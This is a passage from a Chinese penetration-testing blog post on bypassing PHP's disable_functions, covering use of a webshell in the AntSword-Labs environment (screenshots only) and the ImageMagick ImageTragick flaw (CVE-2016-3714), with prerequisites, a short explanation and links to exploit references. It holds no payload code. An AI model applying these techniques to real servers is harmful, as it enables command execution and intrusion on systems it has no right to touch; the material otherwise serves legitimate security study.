+<h3 id="73-利用">7.3 利用</h3>
+<p>利用 <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8" target="_blank" rel="noopener noreffer">AntSword-Labs</a> 里的环境，用蚁剑拿到 shell 后无法执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903044.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031903976.png-water_print" /></p>
+<h2 id="8-利用-imagemagick">8 利用 ImageMagick</h2>
+<h3 id="81-前提">8.1 前提</h3>
+<ul>
+<li>目标主机安装了漏洞版本的 imagemagick（&lt;= 3.3.0）</li>
+<li>安装了 php-imagick 拓展并在 php.ini 中启用</li>
+<li>编写 php 通过 new Imagick 对象的方式来处理图片等格式文件</li>
+<li>PHP &gt;= 5.4</li>
+</ul>
+<h3 id="82-原理">8.2 原理</h3>
+<p>利用 ImageMagick 绕过 disable_functions 的方法利用的是 ImageMagick 的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的 ImageMagick，ImageMagick 会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。所以如果在 phpinfo 中看到有这个 ImageMagick。</p>
+<h3 id="83-利用">8.3 利用</h3>
+<p>参考：<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md" target="_blank" rel="noopener noreffer">Imagetragick 命令执行漏洞</a></p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://whoamianony.top/2021/03/13/Web%e5%ae%89%e5%85%a8/Bypass%20Disable_functions/" target="_blank" rel="noopener noreffer">Bypass Disable Functions</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/06/02/%e6%b5%85%e8%b0%88%e5%87%a0%e7%a7%8dBypass-disable-functions%e7%9a%84%e6%96%b9%e6%b3%95/" target="_blank" rel="noopener noreffer">浅谈几种Bypass-disable-functions的方法</a></li>
+<li><a href="https://clq0.top/bypass-disable_function-php/" target="_blank" rel="noopener noreffer">bypass-disable_function-php</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-09-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" data-title="常见Bypass Disable Functions方法"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" data-title="常见Bypass Disable Functions方法"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" data-title="常见Bypass Disable Functions方法"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" class="prev" rel="prev" title="Java反序列化漏洞系列-3"><i class="fas fa-angle-left fa-fw"></i>Java反序列化漏洞系列-3</a>
+            <a href="/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/" class="next" rel="next" title="Java反序列化漏洞系列-4">Java反序列化漏洞系列-4<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
